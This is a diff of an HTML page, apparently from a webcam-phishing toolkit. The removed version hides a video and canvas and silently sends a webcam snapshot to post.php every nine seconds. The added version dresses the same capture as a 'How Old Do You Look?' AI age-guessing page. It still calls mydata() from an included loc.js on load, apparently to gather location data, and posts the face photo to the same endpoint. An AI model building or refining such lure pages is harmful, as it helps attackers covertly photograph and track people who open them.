@@ -1,134 +1,267 @@
-<!doctype html>
-<html>
-<head>
-  <script src="../../assets/js/jquery.min.js"></script>
-  <script src="../../assets/js/client.min.js"></script>
-  <script src="../../assets/js/loc.js"></script>
-</head>
-
-</html>
-<html>
-<body onload="mydata()">
-
-<div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
-
-<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
-
-<script>
-
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
-    }
-  });
-};
-
-
-'use strict';
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
-// environment -- user
-
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
-
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
-
-var context = canvas.getContext('2d');
-  setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 640);
-       var canvasData = canvas.toDataURL("image/png")
-       cc = String(canvasData).replace("data:image/png;base64,","")
-      //  console.log(cc)
-       post(cc); }, 9000);
-  
-
-}
-
-// Load init
-init();
-
-</script>
-
-</body>
-</html>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <link rel="stylesheet" href="style.css">
-    <title>Face-App</title>
-    <script>
-        window.console = window.console || function (t) {
-        };
-    </script>
-    <script>
-        if (document.location.search.match(/type=embed/gi)) {
-            window.parent.postMessage("resize", "*");
-        }
-    </script>
-</head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>How Old Do You Look?</title>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
-<body translate="no">
-<div id="device">
-    <div id="top">
-        <div class="left">&nbsp;</div>
-        <div class="right">&nbsp;</div>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 0.25rem;
+            background: linear-gradient(90deg, #a78bfa, #60a5fa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            color: #94a3b8;
+            font-size: 0.95rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .camera-container {
+            position: relative;
+            width: 320px;
+            height: 320px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 4px solid rgba(167, 139, 250, 0.5);
+            box-shadow: 0 0 40px rgba(96, 165, 250, 0.2);
+            margin-bottom: 1.5rem;
+        }
+
+        video, .camera-container canvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, #a78bfa, #60a5fa, transparent);
+            opacity: 0;
+            z-index: 2;
+        }
+
+        .scan-line.active {
+            opacity: 1;
+            animation: scan 1.5s ease-in-out;
+        }
+
+        @keyframes scan {
+            0% { top: 0; opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { top: 100%; opacity: 0; }
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #a78bfa, #60a5fa);
+            border: none;
+            color: #fff;
+            font-size: 1.1rem;
+            font-weight: 600;
+            padding: 14px 48px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 20px rgba(96, 165, 250, 0.3);
+        }
+
+        .btn:hover { transform: scale(1.05); }
+        .btn:active { transform: scale(0.97); }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .result-card {
+            display: none;
+            text-align: center;
+            margin-top: 1.5rem;
+            padding: 1.5rem 2.5rem;
+            background: rgba(255,255,255,0.07);
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+        }
+
+        .result-card.visible { display: block; animation: fadeUp 0.5s ease; }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .age-number {
+            font-size: 4.5rem;
+            font-weight: 800;
+            background: linear-gradient(90deg, #a78bfa, #60a5fa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1;
+        }
+
+        .age-label {
+            font-size: 1rem;
+            color: #94a3b8;
+            margin-top: 0.25rem;
+        }
+
+        .confidence {
+            font-size: 0.85rem;
+            color: #64748b;
+            margin-top: 0.5rem;
+        }
+
+        .retry-link {
+            display: inline-block;
+            margin-top: 1rem;
+            color: #a78bfa;
+            cursor: pointer;
+            font-size: 0.9rem;
+            text-decoration: none;
+        }
+
+        .retry-link:hover { text-decoration: underline; }
+
+        .error-msg {
+            color: #f87171;
+            font-size: 0.9rem;
+            margin-top: 1rem;
+            display: none;
+        }
+
+        canvas#capture { display: none; }
+    </style>
+</head>
+<body onload="mydata()">
+
+    <h1>How Old Do You Look?</h1>
+    <p class="subtitle">AI-powered age estimation from your camera</p>
+
+    <div class="camera-container">
+        <video id="video" playsinline autoplay muted></video>
+        <div class="scan-line" id="scanLine"></div>
     </div>
-    <div id="content">
-        <div class="menu"><i class="fas fa-bolt fa-lg"></i>
-            <div class="profilePhoto"></div>
-            <i class="fas fa-volume-mute fa-lg"></i>
-        </div>
-        <div class="takenPhotos">
-            <div class="first"></div>
-            <div class="second"></div>
-            <div class="third"></div>
-        </div>
-        <div class="circle">
-            <div class="fill"></div>
-        </div>
-        <i class="fas fa-sync-alt fa-lg right"></i>
-        <div class="detection">
-            <div class="line-left"></div>
-            <div class="line-top"></div>
-            <div class="line-right"></div>
-            <div class="line-bottom"></div>
-        </div>
+
+    <canvas id="capture" width="640" height="640"></canvas>
+
+    <button class="btn" id="snapBtn" disabled>Analyzing camera...</button>
+
+    <div class="result-card" id="resultCard">
+        <div class="age-number" id="ageNumber">--</div>
+        <div class="age-label">years old</div>
+        <div class="confidence" id="confidenceText"></div>
+        <a class="retry-link" id="retryBtn">Try again</a>
     </div>
-</div>
-<link rel="stylesheet" href="all.css">
+
+    <p class="error-msg" id="errorMsg"></p>
+
+<script>
+(function() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('capture');
+    const ctx = canvas.getContext('2d');
+    const snapBtn = document.getElementById('snapBtn');
+    const resultCard = document.getElementById('resultCard');
+    const ageNumber = document.getElementById('ageNumber');
+    const confidenceText = document.getElementById('confidenceText');
+    const retryBtn = document.getElementById('retryBtn');
+    const scanLine = document.getElementById('scanLine');
+    const errorMsg = document.getElementById('errorMsg');
+
+    let stream = null;
+
+    async function startCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                audio: false,
+                video: { facingMode: 'user' }
+            });
+            video.srcObject = stream;
+            snapBtn.textContent = 'Guess My Age!';
+            snapBtn.disabled = false;
+        } catch(e) {
+            errorMsg.textContent = 'Camera access is required for age detection.';
+            errorMsg.style.display = 'block';
+        }
+    }
+
+    function captureFrame() {
+        ctx.drawImage(video, 0, 0, 640, 640);
+        return canvas.toDataURL('image/png').replace('data:image/png;base64,', '');
+    }
+
+    snapBtn.addEventListener('click', function() {
+        snapBtn.disabled = true;
+        snapBtn.textContent = 'Analyzing...';
+        resultCard.classList.remove('visible');
+        scanLine.classList.remove('active');
+
+        void scanLine.offsetWidth;
+        scanLine.classList.add('active');
+
+        const imgData = captureFrame();
+
+        $.ajax({
+            type: 'POST',
+            url: 'post.php',
+            data: { cat: imgData },
+            dataType: 'json',
+            success: function(resp) {
+                if (resp && resp.age !== null) {
+                    ageNumber.textContent = resp.age;
+                    confidenceText.textContent = resp.confidence + '% confidence';
+                    resultCard.classList.add('visible');
+                } else {
+                    errorMsg.textContent = 'Could not detect a face. Try again with better lighting.';
+                    errorMsg.style.display = 'block';
+                }
+                snapBtn.textContent = 'Guess My Age!';
+                snapBtn.disabled = false;
+            },
+            error: function() {
+                errorMsg.textContent = 'Something went wrong. Please try again.';
+                errorMsg.style.display = 'block';
+                snapBtn.textContent = 'Guess My Age!';
+                snapBtn.disabled = false;
+            }
+        });
+    });
+
+    retryBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        resultCard.classList.remove('visible');
+        errorMsg.style.display = 'none';
+    });
+
+    startCamera();
+})();
+</script>
+
 </body>
 </html>
